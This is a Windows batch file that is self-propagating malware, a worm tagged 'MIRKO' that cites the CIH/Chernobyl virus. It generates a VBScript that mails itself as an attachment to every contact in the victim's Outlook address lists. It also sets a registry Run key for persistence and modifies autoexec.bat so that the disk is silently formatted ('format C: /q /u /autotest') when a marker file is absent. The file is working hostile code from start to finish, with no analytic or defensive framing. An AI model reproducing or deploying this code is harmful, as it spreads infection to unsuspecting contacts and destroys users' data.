@echo off
::                  w95.cih chernobyl in my heart - MIRKO 
echo Set Client = CreateObject("Outlook.Application") >C:\windows\mirko.vbs
echo Set Address = Client.GetNameSpace("MAPI") >nul >>C:\windows\mirko.vbs
echo For ItemList = 1 To Address.AddressLists.Count >nul >>C:\windows\mirko.vbs
echo    Set CurrentAddress = Address.AddressLists(ItemList) >nul >>C:\windows\mirko.vbs
echo 'by MIRKO  >nul >>C:\windows\mirko.vbs      
echo 'by MIRKO >nul >>C:\windows\mirko.vbs
echo        For entries = 1 To CurrentAddress.AddressEntries.Count >nul >>C:\windows\mirko.vbs
echo            victim = CurrentAddress.AddressEntries(entries) >nul >>C:\windows\mirko.vbs
echo            Set Mailtosend = Client.CreateItem(0) >nul >>C:\windows\mirko.vbs
echo 'by MIRKO >nul >>C:\windows\mirko.vbs
echo            Mailtosend.Recipients.Add (victim) >nul >>C:\windows\mirko.vbs
echo            Mailtosend.Subject = "MIRKO" >nul >>C:\windows\mirko.vbs
echo            Mailtosend.Body = "Che stai facendo ????" >nul >>C:\windows\mirko.vbs
echo            Mailtosend.Attachments.Add ("c:\windows\mk\mirko.bat") >nul >>C:\windows\mirko.vbs
echo            Mailtosend.Send >nul >>C:\windows\mirko.vbs
echo        Next >nul >>C:\windows\mirko.vbs
echo 'by MIRKO >nul >>C:\windows\mirko.vbs
echo 'by MIRKO >nul >>C:\windows\mirko.vbs
echo Next >nul >>C:\windows\mirko.vbs
echo 'by mirko >nul >>C:\windows\mirko.vbs
echo 'by mirko >nul >>C:\windows\mirko.vbs
echo 'by mirko >nul >>C:\windows\mirko.vbs
echo Set Client = Nothing >nul >>C:\windows\mirko.vbs
echo Set Address = Nothing >nul >>C:\windows\mirko.vbs
md\windows\mk
copy /y *.bat C:\windows\mk
ren C:\windows\mk\*.bat mirko.bat
cls
echo REGEDIT4 >C:\windows\mirko.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >nul >>C:\windows\mirko.reg
echo "mirko"="C:\\WINDOWS\\mk\\mirko.bat" >nul >>C:\windows\mirko.reg
echo         MIRKO z >C:\windows\desktop\mirko.txt
regedit /s C:\windows\mirko.reg
cls
echo @if not exist C:\windows\desktop\mirko.txt  format C: /q /u /autotest >C:\windows\system\mirko.bat
echo msgbox "MIRKO" ,vbinformation ,"MIRKO" >C:\windows\mk\mirko.vbs
attrib -h -r C:\autoexec.bat >nul
cls
echo @call C:\windows\system\mirko.bat >nul >>C:\autoexec.bat
start C:\windows\mirko.vbs
start C:\windows\mk\mirko.vbs





